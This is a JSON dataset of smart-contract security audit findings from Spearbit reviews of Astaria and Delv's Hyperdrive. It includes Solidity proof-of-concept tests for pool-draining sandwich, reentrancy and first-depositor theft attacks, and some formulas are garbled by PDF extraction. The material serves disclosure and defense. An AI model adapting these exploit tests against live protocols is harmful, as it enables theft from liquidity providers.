"strategistFee... have not been used can be removed from the codebase.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "strategistFeeNumerator and strategistFeeDenominator are not used except in getStrategist- Fee (which itself also has not been referred to by other contracts). It looks like these have been replaced by the vault fee which gets set by public vault owners when they create the vault.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "redeemFutureEpoch can be called directly from a public vault to avoid using the endpoint from AstariaRouter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "One can call the redeemFutureEpoch endpoint of the vault directly to avoid the extra gas of juggling assets and multiple contract calls when using the endpoint from AstariaRouter.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Remove unused imports", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "If an imported file is not used, it can be removed.  LienToken.sol#L24 : since Base64 is only imported in this file, if not used it can be removed from the code- base.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Reduce nesting by reverting early", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Code following this pattern: if (<CONDITION>) { <BODY> } else { revert(); } can be simplified to remove nesting using custom errors: if (!<CONDITION>) { revert(); } <BODY> or if using require statements, it can be transformed into: require(<CONDITION>) <BODY>", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "assembly can read constant global variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Yul cannot read global variables, but that is not true for a constant variable as its value is embedded in the bytecode. For instance, highlighted code above have the following pattern: bytes32 slot = WITHDRAW_PROXY_SLOT; assembly { s.slot := slot } Here, WITHDRAW_PROXY_SLOT is a constant which can be used directly in assembly code.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Revert with error messages", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There are many instances of require and revert statements being used without an accompanying error message. Error messages are useful for unit tests to ensure that a call reverted due the intended reason, and helps in identifying the root cause.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Mixed use of require and revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Astaria codebase uses a mix of require and revert statements. We suggest only following one of these ways to do conditional revert for standardization.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "tokenURI should revert on non-existing tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "As per ERC721 standard, tokenURI() needs to revert if tokenId doesn't exist. The current code returns empty string for all inputs.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Inheriting the same contract twice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "VaultImplementation inherits from AstariaVaultBase (reference). Hence, there is no need to inherit AstariaVaultBase in Vault and PublicVault contract as they both inherit VaultImplementation already.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "No need to re-cast variables", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Code above highlights redundant type castings. ERC721 CT = ERC721(address(COLLATERAL_TOKEN())); ... address(msg.sender) These type castings are casting variables to the same type.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Comments do not match implementation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": " Scenario 1 & 2: Comments note where each parameter ends in a packed byte array, or parameter width in bytes. The comments are outdated.  Scenario 3: The unless is not implemented.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Incomplete Natspec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": " LienToken.sol#L616 s, @return missing  LienToken.sol#L738-L750 s, position, @return missing  CollateralToken.sol#L616-L628 tokenId_ missing 93  VaultImplementation.sol#L153-L165 The second * on /** is missing causing the compiler to ignore the Natspec. The Natspec appears to document an old function interface. Params do not match with the function inputs.  VaultImplementation.sol#L298-L310 missing stack and return vaule  AstariaRouter.sol#L75-L77 @param NatSpec is missing for _WITHDRAW_IMPL, _BEACON_PROXY_IMPL and _- CLEARING_HOUSE_IMPL  AstariaRouter.sol#L44-L47 : Leave a comment that AstariaRouter also acts as an IBeacon for different cloned contracts.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Cannot have multiple liens with same parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "Lien Ids are computed by hashing the Lien struct itself. This means that no two liens can have the same parameters (e.g. same amount, rate, duration, etc.).", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Redundant unchecked can be removed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "There are no arithmetic operations in these unchecked blocks. For clarity, it can be removed.", "labels": ["Spearbit", "Astaria", "Severity: Informational LienToken.sol#L264,"]}, {"title": "Argument name reuse with different meaning across contracts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "ken.LienActionEncumber receiver is the lender (the receiver of the LienToken)", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "Licensing conflict on inherited dependencies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Astaria-Spearbit-Security-Review.pdf", "body": "The version of Solmate contracts depended in tne gpl repository on are AGPL Licensed, making the gpl repository adopt the same license. This license is incompatible with the currently UNLICENSED Astaria related contracts.", "labels": ["Spearbit", "Astaria", "Severity: Informational"]}, {"title": "An attacker can force 0 shares to be minted for a liquidity provider", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "If there are no outstanding long positions an attacker can frontrun a call to addLiquidity(...) and open a max possible short position such that z = 0. Then when the liquidity provider's call will go through the _updateLiquidity(_shareReservesDelta) will be a NOOP since z = 0 and the if block below would want to avoid the division by 0: // below z = shareReserves = 0 uint256 shareReserves = _marketState.shareReserves; if (_shareReservesDelta != 0 && shareReserves > 0) { int256 updatedShareReserves = int256(shareReserves) + _shareReservesDelta; _marketState.shareReserves = uint256( // NOTE: There is a 1 wei discrepancy in some of the // calculations which results in this clamping being required. updatedShareReserves >= 0 ? updatedShareReserves : int256(0) ).toUint128(); _marketState.bondReserves = uint256(_marketState.bondReserves) .mulDivDown(_marketState.shareReserves, shareReserves) .toUint128(); } And therefore the point (z, y ) stays the same and does not get scaled. Thus endingPresentValue == starting- PresentValue and so the lpShares calculated below would be 0: lpShares = (endingPresentValue - startingPresentValue).mulDivDown( lpTotalSupply, startingPresentValue ); now when _mint(...) is called with a 0 value as lpShares: // Mint LP shares to the supplier. _mint(AssetId._LP_ASSET_ID, _destination, lpShares); The MultiToken's implementation of _mint(...) will be called: function _mint( uint256 tokenID, address to, uint256 amount ) internal virtual { _balanceOf[tokenID][to] += amount; _totalSupply[tokenID] += amount; // Emit an event to track minting emit TransferSingle(msg.sender, address(0), to, tokenID, amount); } which allows minting when amount == 0.", "labels": ["Spearbit", "Delv", "Severity: Critical Risk"]}, {"title": "Drain pool by sandwiching matured shorts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "When shorts mature, they are not traded on the \"curve\", they use the \"flat\" part of the flat+curve model and are converted 1-to-1 to a base amount that is then added to the share reserves (and bond reserves are updated to keep the spot price the same). However, this update to the reserves still affects the \"curve\" part of the model as it uses the same reserves. An attacker can profit from this by sandwiching this sudden update of the reserves by opening a short and closing it again after the update:  Attacker waits until a short position matures.  Attacker frontruns the application of the checkpoint by opening the max amount of shorts. This brings the share reserves close to 0. (Opening the max amount leads to max profit but opening fewer shorts is still profitable. This means this is not only an attack abusing the chaotic behavior of the curve at the 0-shares point. However, it heavily amplifies the ROI of the attack).  The shorts mature, increasing the reserves.  Attacker backruns by closing their shorts again for a profit. In the proof of concept, the attacker can perform this attack in a single transaction if the checkpoint was not triggered already. They open the short for 72,584e18 base and close for 741,169e18base at a 1021% return. The losses are suffered by the LPs. The sandwich attack leads to losing 66.16% of the pool share reserves. Proof of Concept  Test // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.19; import { VmSafe } from \"forge-std/Vm.sol\"; import { stdError } from \"forge-std/StdError.sol\"; import \"forge-std/console2.sol\"; import { AssetId } from \"contracts/src/libraries/AssetId.sol\"; import { Errors } from \"contracts/src/libraries/Errors.sol\"; import { FixedPointMath } from \"contracts/src/libraries/FixedPointMath.sol\"; import { HyperdriveMath } from \"contracts/src/libraries/HyperdriveMath.sol\"; import { YieldSpaceMath } from \"contracts/src/libraries/YieldSpaceMath.sol\"; import { HyperdriveTest, HyperdriveUtils, IHyperdrive } from \"../../utils/HyperdriveTest.sol\"; import { Lib } from \"../../utils/Lib.sol\"; contract SpearbitTest is HyperdriveTest { using FixedPointMath for uint256; using HyperdriveUtils for IHyperdrive; using Lib for *; function setUp() public override { super.setUp(); // Start recording event logs. vm.recordLogs(); } function test_sandwich_maturing_shorts() external 6 { uint256 apr = 0.01e18; uint256 contribution = 1_000_000e18; initialize(alice, apr, contribution); // 0. Alice shorts some bonds. uint256 bondAmount = 100_000e18; (uint256 maturityTime, uint256 baseAmount) = openShort(alice, bondAmount, true); console2.log(\"maturing bonds\", bondAmount / 1e18); // 1. let shorts mature // we move to the checkpoint AFTER maturity so we can do openShort + ,! checkpoint(maturity) + closeShort // in a single transaction, risk-free profit. // It  s also possible to do openShort 1 second before maturity, and the rest at ,! maturity. uint256 checkpointDuration = hyperdrive.getPoolConfig().checkpointDuration; advanceTime(maturityTime - block.timestamp + checkpointDuration, 0.01e18); IHyperdrive.PoolInfo memory poolInfo = hyperdrive.getPoolInfo(); console2.log(\"share/bonds resereves before openShort %s / %s\", poolInfo.shareReserves / ,! 1e18, poolInfo.bondReserves / 1e18); // 2. attacker Bob opens max shorts, leaving the pool with 0 share reserves // there is another bug where the protocol reverts when applying the checkpoint in    ,! checkpoint -> _updateLiquidity  // the toUint128 reverts for ,! uint256(_marketState.bondReserves).mulDivDown(_marketState.shareReserves, shareReserves)) // therefore, we reduce the max short amount a little bit s.t. the updated bond reserves ,! don t overflow uint128  uint256 bondAmountSandwich = hyperdrive.calculateMaxShort() - 1e11; (uint256 maturityTimeSandwich, uint256 baseAmountSandwich) = openShort(bob, ,! bondAmountSandwich, true); console2.log(\"sandwich: opened %s bonds with %s base\", bondAmountSandwich / 1e18, ,! baseAmountSandwich / 1e18); poolInfo = hyperdrive.getPoolInfo(); console2.log(\"share/bonds resereves after openShort %s / %s\", poolInfo.shareReserves / ,! 1e18, poolInfo.bondReserves / 1e18); // 3. attacker triggers the maturing of old shorts, this adds back to the reserves hyperdrive.checkpoint(maturityTime); // 4. attacker now closes their shorts for a profit uint256 baseProceeds = closeShort(bob, maturityTimeSandwich, bondAmountSandwich); console2.log(\"sandwich: baseProceeds: %s, ROI: %s%\", baseProceeds / 1e18, baseProceeds * ,! 1e2 / baseAmountSandwich); poolInfo = hyperdrive.getPoolInfo(); console2.log(\"share/bonds resereves at end %s / %s\", poolInfo.shareReserves / 1e18, ,! poolInfo.bondReserves / 1e18); } }  Output Here is a model demonstrating how the curve changes after the operations. 7 parameter description (cid:15) P1 P2 P3 P4 P5 dy Tiny amount to avoid z getting close to 0 when solving for the max short move Initial point The point after opening the first short position, moves on the curve C1 The point after opening the second short position, moves on the curve C2 which passes through P2 The point after applying the checkpoint for the maturity time of the first open short position The point after closing the second short position, moves on the C3 which passes through P4 The amount bonds opened in the first open short position", "labels": ["Spearbit", "Delv", "Severity: Critical Risk"]}, {"title": "Reentrancy in StEthHyperdrive.openShort", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The StethHyperdrive._deposit function contains refund logic which performs a .call to the msg.sender. When opening shorts, this _deposit with the callback happens in the middle of state updates which can be abused by an attacker. The _deposit happens after calculating the short reserves updates (_calcula- teOpenShort) but before applying these updates to the reserves. When the attacker receives the callback they can trade on the same curve with the same reserves a second time which allows them to get a better price execution (incurring less slippage) than a single large trade. In the proof of concept, the attacker opens half the short initially and half the short through reentrancy, and then immediately closes the total short amount for a profit, draining the pool funds. Proof of concept Note: The proof of concept was implemented by adjusting the MockHyperdrive to mimic the behavior of StEthHyperdrive's callback.  Changes to MockHyperdrive: 8 function _deposit(uint256 amount, bool) internal override returns (uint256, uint256) { + _callback(); uint256 assets = _baseToken.balanceOf(address(this)); bool success = _baseToken.transferFrom(msg.sender, address(this), amount); if (!success) { revert Errors.TransferFailed(); } if (totalShares == 0) { totalShares = amount; return (amount, FixedPointMath.ONE_18); } else { uint256 newShares = totalShares.mulDivDown(amount, assets); totalShares += newShares; return (newShares, _pricePerShare()); } } + function _callback() internal { + + // I added this to simulate the ETH refund callback in // NOTE: we are doing the callback before transferFrom    StEthHyperdrive . to simulate the share price not  ,! ,! ,! ,! changing as the StEthHyperdrive callback happens before share price unchanged, it in between the share price, which would not simulate StEthHyperdrive (or any atomic deposit). lido.getTotalPooledEther().divDown(lido.getTotalShares()); transferFrom totalShares submit update in the Mock, it will change the ting to lido and leaves its and       . If we do   (bool success,) = payable(msg.sender).call{value: 0}(\"\"); if (!success) { revert Errors.TransferFailed(); } + + + + + }  Test // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.19; import { VmSafe } from \"forge-std/Vm.sol\"; import { stdError } from \"forge-std/StdError.sol\"; import \"forge-std/console2.sol\"; import { AssetId } from \"contracts/src/libraries/AssetId.sol\"; import { Errors } from \"contracts/src/libraries/Errors.sol\"; import { FixedPointMath } from \"contracts/src/libraries/FixedPointMath.sol\"; import { HyperdriveMath } from \"contracts/src/libraries/HyperdriveMath.sol\"; import { YieldSpaceMath } from \"contracts/src/libraries/YieldSpaceMath.sol\"; import { HyperdriveTest, HyperdriveUtils, IHyperdrive } from \"../../utils/HyperdriveTest.sol\"; import { Lib } from \"../../utils/Lib.sol\"; contract SpearbitTest is HyperdriveTest { using FixedPointMath for uint256; using HyperdriveUtils for IHyperdrive; using Lib for *; uint256 internal recurseDepth = 0; uint256 internal constant bondAmountToBuy = 1_000_000e18; function setUp() public override { super.setUp(); // Start recording event logs. vm.recordLogs(); } 9 function test_open_short_reentrancy() external { uint256 apr = 0.10e18; uint256 contribution = 1_000_000e18; initialize(alice, apr, contribution); // Short some bonds. uint256 baseBalanceBefore = baseToken.balanceOf(address(this)); // uint256 bondAmount = bondAmountToBuy; uint256 bondAmount = bondAmountToBuy / 2; (uint256 maturityTime, uint256 baseAmount) = openShort(address(this), bondAmount, true); console2.log(\"baseAmount paid for first short\", baseAmount / 1e18); IHyperdrive.PoolInfo memory poolInfo = hyperdrive.getPoolInfo(); uint256 tokenId = AssetId.encodeAssetId(AssetId.AssetIdPrefix.Short, maturityTime); uint256 totalShorts = hyperdrive.balanceOf(tokenId, address(this)); console2.log(\"total shorts\", totalShorts / 1e18); // // Redeem the bonds. uint256 baseProceeds = closeShort(address(this), maturityTime, totalShorts); console2.log(\"baseProceeds closing shorts\", baseProceeds / 1e18); } receive() payable external { recurseDepth++; if(recurseDepth > 1) return; uint256 bondAmount = bondAmountToBuy / 2; (uint256 maturityTime, uint256 baseAmount) = openShort(address(this), bondAmount, true); console2.log(\"baseAmount paid for 2nd short\", baseAmount / 1e18); } }  Output", "labels": ["Spearbit", "Delv", "Severity: Critical Risk"]}, {"title": "addLiquidity(...) can be griefed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "An attacker can DoS/block another use to provide liquidity to the Hyperdrive. The attack works as follows: 1. The attacker frontruns a transaction that would call addLiquidity(...) by opening the maximum possible short. In case of no or small outstanding longs ( 0 such that: L0 c (cid:24) 0 ), the attacker can reduce the z to a number close to 1 (cid:0) APR = (cid:1)t norm pos ts (cid:22)z y (cid:22)z y ts blows up to a really big number since the denominator or ts (cid:22)z y would be a really small number such the apr = HyperdriveMath.calculateAPRFromReserves(...) would not be less than or equal to _maxApr provided by the user in the next transaction. The attacker might also be able to trigger division by (cid:22)z y = 0 revert. 2. The user's transaction of calling addLiquidity(...) would be processed and reverted due to above. Even if the user sets _maxApr = type(uint256).max, the attacker can take advantage of the division by 0 case or if that is not possible the following calculation of lpShares would underflow and revert due to the fact that endingPresentValue < startingPresentValue: lpShares = (endingPresentValue - startingPresentValue).mulDivDown( lpTotalSupply, startingPresentValue ); This line of attack is similar to the ones used in the below issues where the attacker tries to open a short with the maximum possible amount:  Sandwich a call to addLiquidity(...) for profit  Drain pool by sandwiching matured shorts", "labels": ["Spearbit", "Delv", "Severity: High Risk"]}, {"title": "Applying checkpoint can revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The applyCheckpoint function can revert even with conservative pool parameters and reserves. It can revert in _applyCloseShort -> _updateLiquidity when checking that the bond reserves fit into a uint128 value: int256(0)).toUint128(); uint256 shareReserves = _marketState.shareReserves; _marketState.shareReserves = uint256(updatedShareReserves >= 0 ? updatedShareReserves : ,! _marketState.bondReserves = uint256(_marketState.bondReserves) .mulDivDown(_marketState.shareReserves, shareReserves) .toUint128(); The _marketState.shareReserves / shareReserves factor can become large if there were close to 0 shares in the reserves and a large shares update comes in. This can happen, for example, if opening shorts brought the share reserves close to 0 and then matured shorts put back a lot of share reserves afterwards. See the POC for this example. The impact is that one cannot trade on the AMM anymore as all trades first try to apply the current checkpoint. The bonds for this checkpoint can never be closed, permanently locking up LP and trader funds. Proof of Concept:  Test // SPDX-License-Identifier: Apache-2.0 pragma solidity 0.8.19; import { VmSafe } from \"forge-std/Vm.sol\"; import { stdError } from \"forge-std/StdError.sol\"; import \"forge-std/console2.sol\"; import { AssetId } from \"contracts/src/libraries/AssetId.sol\"; import { Errors } from \"contracts/src/libraries/Errors.sol\"; import { FixedPointMath } from \"contracts/src/libraries/FixedPointMath.sol\"; import { HyperdriveMath } from \"contracts/src/libraries/HyperdriveMath.sol\"; import { YieldSpaceMath } from \"contracts/src/libraries/YieldSpaceMath.sol\"; import { HyperdriveTest, HyperdriveUtils, IHyperdrive } from \"../../utils/HyperdriveTest.sol\"; import { Lib } from \"../../utils/Lib.sol\"; contract SpearbitTest is HyperdriveTest { using FixedPointMath for uint256; using HyperdriveUtils for IHyperdrive; using Lib for *; // uint256 internal recurseDepth = 0; // uint256 internal constant bondAmountToBuy = 100_000e18; function setUp() public override { super.setUp(); // Start recording event logs. vm.recordLogs(); } function test_checkpoint_revert() external 12 { uint256 apr = 0.01e18; uint256 contribution = 1_000_000e18; initialize(alice, apr, contribution); // 0. Alice shorts some bonds. uint256 bondAmount = 100_000e18; (uint256 maturityTime, uint256 baseAmount) = openShort(alice, bondAmount, true); console2.log(\"maturing bonds\", bondAmount / 1e18); // 1. let shorts almost mature uint256 checkpointDuration = hyperdrive.getPoolConfig().checkpointDuration; advanceTime(maturityTime - block.timestamp - 1, 0.01e18); IHyperdrive.PoolInfo memory poolInfo = hyperdrive.getPoolInfo(); console2.log(\"share/bonds resereves before openShort %s / %s\", poolInfo.shareReserves, ,! poolInfo.bondReserves); // 2. attacker Bob opens max shorts, leaving the pool with 0 share reserves uint256 bondAmountSandwich = hyperdrive.calculateMaxShort(); (uint256 maturityTimeSandwich, uint256 baseAmountSandwich) = openShort(bob, ,! bondAmountSandwich, true); poolInfo = hyperdrive.getPoolInfo(); console2.log(\"share/bonds resereves after openShort %s / %s\", poolInfo.shareReserves, ,! poolInfo.bondReserves); // 3. attacker triggers the maturing of old shorts, this reverts when safe-casting to ,! uint128 advanceTime(1, 0.00e18); hyperdrive.checkpoint(maturityTime); } }", "labels": ["Spearbit", "Delv", "Severity: High Risk"]}, {"title": "First LP can steal subsequent LP provisions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The AaveHyperdrive and DsrHyperdrive compute the yield share contribution of LPs in _deposit as uint256 newShares = totalShares_.mulDivDown(amount, assets);. Furthermore, the assets can be arti- ficially inflated by donating to the contract. The first depositor can use this to steal subsequent LP provisions by frontrunning them with a donation and making them mint 0 yield shares. The 0 yield shares contribution also trans- lates to 0 minted LP shares as Hyperdrive's present value does not change. The attacker can afterward redeem their own shares for the entirety of the assets, including the assets of the victim LP. Example:  Victim calls AaveHyperdrive.addLiquidity with a contribution of 1e6 * 1e18 DAI. The transaction is pend- ing in the mem pool.  The attacker (the first and sole LP) removes their liquidity (or adds liquidity) such that the totalSupply is 1. For example, assume totalSupply = totalAssets = 1 with a sharePrice = 1e18.  The attacker donates 1e6 * 1e18 DAI to the pool, totalSupply = 1, totalAssets = 1e24 + 1. 13  The victim transaction is mined, _deposit calculates newShares = totalShares_.mulDivDown(amount, assets) = 1 * 1e24 / (1e24 + 1) = 0. totalSupply = 1, totalAssets = 2e24 + 1.  The attacker withdraws and receives the totalAssets = 2e24 + 1 with a profit of the victim's contribution.", "labels": ["Spearbit", "Delv", "Severity: High Risk"]}, {"title": "pow function silently overflows and yields wrong results", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The FixedPointMath.pow function can silently overflow in the intermediate computation of ylnx := mul(y_int256, lnx). The final result will be wrong. function test_pow() public { uint256 x = 2e18; // computes y * ln(x) first with x,y 18-decimal fixed point // chosen s.t. y * ln(x) overflows and is close to 0 uint256 y = type(uint256).max / uint256(FixedPointMath.ln(int256(x))) + 1; // 2.0 ** y should be a huge value but is 1.0 (1e18) as y*ln(x) overflows and then computes exp(0) = 1e18 uint256 res = FixedPointMath.pow(x, y); assertEq(res, 1e18); // this should not be true but is ,! } This function is used by several computations in HyperdriveMath.sol and YieldSpaceMath.sol.", "labels": ["Spearbit", "Delv", "Severity: High Risk"]}, {"title": "Governance fees are part of share reserves when opening shorts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Governance fees are not supposed to be part of the share reserves. When opening shorts, they are part of the shares reserves. The relevant flow of variables in openShort is as follows: openShort(bondAmount) // _calculateOpenShort shareReservesDelta = HDM.calculateOpenShort(bondAmount) // YSM.calculateSharesOutGivenBondsIn on curve shareReservesDelta -= totalCurveFee traderDeposit = HDM.calculateShortProceeds(bondAmount, shareReservesDelta) // _applyOpenShort marketState.shareReserves -= shareReservesDelta // shareReserves // = shareReserves - shareReservesDelta + totalCurveFee marketState.bondReserves += bondAmount = shareReserves - shareReservesDelta   _mint(bondAmount) 14 As totalCurveFee includes the totalGovernanceFee, it is also part of the updated share reserves. They are currently part of the shares that can be traded and it can lead to the governance fees being traded out and governance will be unable to claim their fees.", "labels": ["Spearbit", "Delv", "Severity: High Risk"]}, {"title": "Governance fees are part of share reserves when closing non-matured longs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "Governance fees are not supposed to be part of the share reserves. When closing non-matured longs, they are part of the shares reserves. The relevant flow of variables in closeLong is as follows: closeLong(bondAmount@maturity) // _calculateCloseLong (shareReservesDelta, bondReservesDelta, shareProceeds) = ,! shareReservesDelta -= totalCurveFee; shareProceeds -= totalCurveFee + totalFlatFee; HDM.calculateCloseLong(bondAmount@maturity@closeSharePrice) // _applyCloseLong marketState.shareReserves -= shareReservesDelta // = shareReserves - shareReservesDelta + totalCurveFee marketState.bondReserves += bondReservesDelta // = bondReserves + bondReservesDelta _updateLiquidity(-[shareProceeds - shareReservesDelta] = -flatCurvePart)  // = shareReserves - (shareProceeds  // = shareReserves - shareProceeds // = shareReserves - shareProceeds + totalCurveFee + totalFlatFee + shareReservesDelta // = shareReserves - shareProceeds + totalCurveFee + totalFlatFee + shareReservesDelta - totalCurveFee // = shareReserves - shareProceeds + totalFlatFee + shareReservesDelta - shareReservesDelta  + shareReservesDelta   ) // combining both share reserve updates: // shareReserves // = shareReserves - shareProceeds   = shareReserves - shareReservesDelta = shareReserves - shareProceeds + totalCurveFee + totalFlatFee  - (shareProceeds  - shareReservesDelta  ) As totalCurveFee + totalFlatFee includes the totalGovernanceFee, it is also part of the updated share re- serves. It can also be seen by noting that in the entire close-long process, totalGovernanceFee is never read except when adding it to the governance fee storage variable. They are currently part of the shares that can be traded and it can lead to the governance fees being traded out and governance will be unable to claim their fees.", "labels": ["Spearbit", "Delv", "Severity: High Risk"]}, {"title": "No LP fees when closing matured longs/shorts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "When closing matured longs through closeLong or checkpoint, _applyCheckpoint is first run which closes the matured longs/shorts for this checkpoint. This function, however, does not take a fee on the sharePro- ceeds. The share (and bond) reserves are updated by updateLiquidity(-shareProceeds) which reduces the share proceeds by the fee-exclusive shareProceeds. When traders now close their positions by calling closeLong, their own shareProceeds are reduced by the to- talFlatFee but this fee is never added back to the share reserves, i.e., never reinvested for the LPs. Note that the same issue also applies to closing shorts.", "labels": ["Spearbit", "Delv", "Severity: High Risk"]}, {"title": "ERC4626DataProvider does not calculate the price per share correctly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "ERC4626DataProvider does not calculate the price per share correctly. It returns the inverse of the price per share. This hook is implemented correctly in ERC4626Hyperdrive.", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "totalSupply / balances accounting invariant will break on transfers to address(0) and address(this)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "The code is trying to use a certain trick to revert on transfers to address(0) and address(this) (a common check to avoid locking assets by error) by setting the balanceOf of these addresses to the max value, which after adding any value > 0 should revert. // By setting these addresses to the max uint256, attempting to execute // a transfer to either of them will revert. This is a gas-efficient way // to prevent a common user mistake where they transfer to the token // address. These values are not considered // included in total supply // WARN - Never allow allowances to be set for these addresses. balanceOf[address(0)] = type(uint256).max; balanceOf[address(this)] = type(uint256).max; real which only contains minted tokens. tokens and so are not     While this would hold in a common scenario with pragma version (cid:2)0.8, the code is using a gas optimized ERC20 library, anmely Solmate, whose transfer and _mint use unchecked blocks. Incrementing within the unchecked block will lead to overflow, breaking thus the relation between totalSupply and the sum of all balances' accounting when calling _mint() or transfer: // Cannot overflow because the sum of all user // balances can unchecked { t exceed the max uint256 value.  balanceOf[to] += amount; } Additionally, it breaks the balances invatiant ( sum of all balances <= totalSupply) that the code should hold, by setting these values to max value. In example, consider this case (for simplicity all with initial values):  Initial balanceOf[0] = type(uint256).max.  Call to _mint() (which can be accomplished by calling mint to address(0) with amount 2 and to equal to address(0).  Expected behavior as per comments ! revert. The real result is:  Expected totalSupply = 2.  balanceOf[0] = 1 while it should be balanceOf[0] == 2 if this wasn't set to type(uint256).max.", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "calculateSpotPrice(...) should not use _normalizedTimeRemaining", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "When one trades on the curve, the following share-bond curve is used (with fixed ts): c ((cid:22)z)1(cid:0)ts + y 1(cid:0)ts = k (cid:22) If one calculates the spot price which is the slope of the perpendicular line to the tangent of the curve at a point like (z, y ) we would get: dz (cid:0)dy = ts 1 c (cid:22)z y Instead in calculateSpotPrice(...) the spot price is calculated as: There are two issues where the first is more important: dz (cid:0)dy = tr ts (cid:22)z y 1 c 1. The factor is not considered. This is due to a wrong NatSpec comment that mentions calculateSpot- Price(...) calculates the spot price without slippage of bonds in terms of shares, but it should be the spot price of bonds in terms of the base. 2. tr or _normalizedTimeRemaining does not have a concrete meaning since it is not used in the definition of the curve, but one can apply it to manipulate the price which will be used in fee calculations. But again those fee calculations should not consider the tr in the exponent when calculating fees for non-matured positions. The spot price is recorded for oracles and is also used in LP and governance fee calculations.", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "Curve part is not reduced by negative variable interest growth when closing longs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "When closing longs during a period of negative interest, the trader's proceeds are reduced propor- tionally to the negative growth. However, this is only done on the shareProceeds variable which represents both flat and curve parts, the curve part shareReservesDelta is not reduced by this amount but it should be. It also checks the negative interest region compared to the beginning of the deployment (_initialSharePrice) instead of the beginning of opening the longs (_openSharePrice).", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "Removing liquidity does not reduce the shares received by the overestimated amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "When redeeming liquidity leads to negative withdrawal shares and the share proceeds are adjusted again, the overestimatedProceeds that are treated as contributing to withdrawal shares are still paid out to the LP.", "labels": ["Spearbit", "Delv", "Severity: Medium Risk"]}, {"title": "Sandwich a call to addLiquidity(...) for profit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Delv-Spearbit-Security-Review-June-2023.pdf", "body": "When a user opens a short position the lower bound for the updated z is . So in an absence of long outstanding positions or if L0 is really small, a user can open a short position such that it would move z really close to 0. This will cause if at a later point, flat trade is being applied small positive change in z can cause a really big change in y . These flat 